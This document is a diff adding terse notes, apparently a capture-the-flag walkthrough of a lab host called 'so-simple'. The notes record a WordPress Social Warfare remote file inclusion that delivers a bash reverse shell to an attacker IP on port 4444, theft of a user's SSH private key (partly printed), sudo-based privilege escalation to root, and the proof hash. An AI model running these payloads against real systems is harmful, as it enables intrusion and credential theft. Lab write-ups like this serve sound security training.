@@ -1,0 +1,102 @@
+
+
+
+http://192.168.127.78/wordpress/
+
+
+
+
+WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                    | php/webapps/46794.py
+
+possibly (do not know version info)
+WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload                    | php/webapps/48979.py
+WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                    | php/webapps/48449.py
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat payload.txt            
+<pre>system("bash -c \"bash -i >& /dev/tcp/192.168.45.210/4444 0>&1\"")</pre>
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+
+
+http://192.168.127.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.210:80/payload.txt
+
+
+
+www-data@so-simple:/home/max/.ssh$ ls
+ls
+authorized_keys
+id_rsa
+id_rsa.pub
+www-data@so-simple:/home/max/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAx231yVBZBsJXe/VOtPEjNCQXoK+p5HsA74EJR7QoI+bsuarBd4Cd
+
+ssh in as max
+
+max@so-simple:~$ sudo -l
+Matching Defaults entries for max on so-simple:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User max may run the following commands on so-simple:
+    (steven) NOPASSWD: /usr/sbin/service
+
+
+
+
+max@so-simple:~$ sudo -u steven /usr/sbin/service ../../../../bin/sh -p
+$ whoami
+steven
+$ 
+$ sudo -l
+Matching Defaults entries for steven on so-simple:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User steven may run the following commands on so-simple:
+    (root) NOPASSWD: /opt/tools/server-health.sh
+$ 
+
+
+$ sudo -l      
+Matching Defaults entries for steven on so-simple:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User steven may run the following commands on so-simple:
+    (root) NOPASSWD: /opt/tools/server-health.sh
+$ cat server-health.sh
+#!/bin/bash
+bash -p
+
+$ chmod +x server-health.sh
+$ ls -lsa
+total 12
+4 drwxrwxr-x 2 steven steven 4096 Oct  6 03:06 .
+4 drwxr-xr-x 3 steven steven 4096 Oct  6 02:40 ..
+4 -rwxrwxr-x 1 steven steven   20 Oct  6 03:05 server-health.sh
+$ sudo /opt/tools/server-health.sh
+root@so-simple:/opt/tools# ls
+server-health.sh
+root@so-simple:/opt/tools# cd /root
+root@so-simple:~# ls
+flag.txt  proof.txt  snap
+root@so-simple:~# cat flag.txt
+This is not the flag you're looking for...
+root@so-simple:~# cat proof.txt
+89950214798f171859857fa90d47d0f9
+root@so-simple:~# 
+
+
+
+
+
+
+
+
+
